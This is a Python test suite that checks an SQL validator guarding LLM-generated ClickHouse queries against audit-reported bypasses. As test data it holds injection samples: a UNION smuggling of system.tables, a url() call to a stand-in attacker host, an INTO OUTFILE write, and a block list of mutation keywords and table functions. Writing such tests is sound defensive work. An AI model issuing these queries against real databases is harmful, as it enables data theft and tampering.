"""Regression tests for app/llm/sql_validator.

Covers the High-finding #3 from SECURITY_AUDIT.md (UNION bypass, ClickHouse
table functions like url()/remote()/file()/s3(), subquery-embedded refs,
OPTIMIZE and other ClickHouse-specific DDL).
"""

import pytest

from app.llm.sql_validator import validate_sql, ensure_limit


class TestHappyPath:
    def test_simple_select_allowed(self):
        ok, err = validate_sql("SELECT count() FROM silver.dim_deals WHERE archived = 0")
        assert ok, err

    def test_with_cte_allowed(self):
        ok, err = validate_sql(
            "WITH t AS (SELECT deal_id FROM silver.dim_deals) "
            "SELECT count() FROM silver.dim_deals WHERE deal_id IN (SELECT deal_id FROM t)"
        )
        assert ok, err


class TestMutations:
    @pytest.mark.parametrize("kw", [
        "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE",
        "GRANT", "REVOKE", "ATTACH", "DETACH", "RENAME",
        "SYSTEM", "OPTIMIZE", "KILL", "EXCHANGE", "FREEZE", "UNFREEZE",
    ])
    def test_mutation_keyword_blocked(self, kw):
        sql = f"SELECT count() FROM silver.dim_deals; {kw} TABLE silver.dim_deals"
        ok, err = validate_sql(sql)
        assert not ok
        assert kw in (err or "")


class TestUnionBlocked:
    def test_union_blocks_table_whitelist_bypass(self):
        # Legitimate table on the left, system smuggled in via UNION
        sql = (
            "SELECT deal_id FROM silver.dim_deals "
            "UNION ALL "
            "SELECT name FROM system.tables"
        )
        ok, err = validate_sql(sql)
        assert not ok
        # Either UNION block OR system block — both are correct rejections
        assert "UNION" in (err or "") or "system" in (err or "")

    def test_plain_union_blocked(self):
        ok, err = validate_sql("SELECT 1 UNION SELECT 2")
        assert not ok
        assert "UNION" in (err or "")


class TestTableFunctions:
    @pytest.mark.parametrize("fn", [
        "url", "remote", "remoteSecure", "file", "s3", "hdfs",
        "mysql", "postgresql", "input", "merge", "cluster",
    ])
    def test_table_function_blocked(self, fn):
        sql = f"SELECT * FROM {fn}('whatever')"
        ok, err = validate_sql(sql)
        assert not ok, f"{fn}() should be rejected"
        # Note: SELECT * itself also rejects; either is a valid rejection
        assert fn in (err or "") or "SELECT *" in (err or "")

    def test_url_in_subquery_blocked(self):
        sql = (
            "SELECT deal_id FROM silver.dim_deals "
            "WHERE deal_id IN (SELECT id FROM url('http://attacker/x.csv', CSV, 'id String'))"
        )
        ok, err = validate_sql(sql)
        assert not ok
        assert "url" in (err or "")


class TestSubqueryTableRefs:
    def test_subquery_with_disallowed_table_caught(self):
        sql = (
            "SELECT deal_id FROM silver.dim_deals "
            "WHERE deal_id IN (SELECT name FROM system.tables)"
        )
        ok, err = validate_sql(sql)
        assert not ok
        # `system.tables` is caught by either the system.* block or the whitelist check
        assert "system" in (err or "") or "not allowed" in (err or "")


class TestExfiltrationSinks:
    def test_into_outfile_blocked(self):
        sql = "SELECT deal_id FROM silver.dim_deals INTO OUTFILE '/tmp/x'"
        ok, err = validate_sql(sql)
        assert not ok
        assert "OUTFILE" in (err or "") or "DUMPFILE" in (err or "")


class TestEnsureLimit:
    def test_appends_limit_when_missing(self):
        sql = "SELECT count() FROM silver.dim_deals"
        out = ensure_limit(sql, max_limit=500)
        assert "LIMIT 500" in out

    def test_no_op_when_limit_present(self):
        sql = "SELECT deal_id FROM silver.dim_deals LIMIT 10"
        out = ensure_limit(sql)
        assert out == sql
